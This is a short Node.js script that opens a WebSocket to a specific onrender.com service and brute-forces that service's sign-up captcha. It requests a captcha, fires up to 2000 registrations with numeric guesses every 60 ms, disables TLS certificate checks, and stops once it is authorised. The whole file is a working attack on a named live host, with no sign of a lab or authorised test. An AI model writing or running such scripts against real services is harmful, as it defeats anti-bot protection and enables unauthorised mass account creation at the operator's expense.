const WebSocket = require('ws');
const url = 'wss://weblondeolencatacak.onrender.com/client';
const username = 'bf' + Math.floor(Math.random()*100000);
const password = 'Pa55word!';
const maxAttempts = 2000; // try 0..1999
const delayMs = 60; // ms between attempts
let attempt = 0;
let gotCaptcha = false;
let ws;

function sleep(ms){return new Promise(r=>setTimeout(r,ms));}

function start(){
  ws = new WebSocket(url, {rejectUnauthorized:false});
  ws.on('open', ()=>{
    console.log('OPEN');
    // request captcha image for signUp
    ws.send(JSON.stringify({captcha:'signUp'}));
  });
  ws.on('message', async (data)=>{
    try{
      const msg = JSON.parse(data.toString());
      if (msg.captcha && msg.captcha.data){
        console.log('CAPTCHA image received; starting brute attempts up to', maxAttempts);
        gotCaptcha = true;
        for(attempt=0; attempt<maxAttempts; attempt++){
          const code = attempt.toString();
          const pad = code; // server uses regex, no padding assumed
          const reg = { authentication: { username: username, password: password, register: true, captcha: pad } };
          ws.send(JSON.stringify(reg));
          if (attempt % 100 === 0) console.log('Tried', attempt);
          await sleep(delayMs);
        }
        console.log('Finished attempts');
      }
      if (msg.unauth) {
        // show occasional unauths
        //console.log('unauth', msg.unauth);
      }
      if (msg.Authorized) {
        console.log('AUTHORIZED!', JSON.stringify(msg));
        process.exit(0);
      }
    }catch(e){
      // ignore
    }
  });
  ws.on('close', ()=>console.log('CLOSED'));
  ws.on('error',(e)=>console.error('ERR',e && e.message));
}

start();
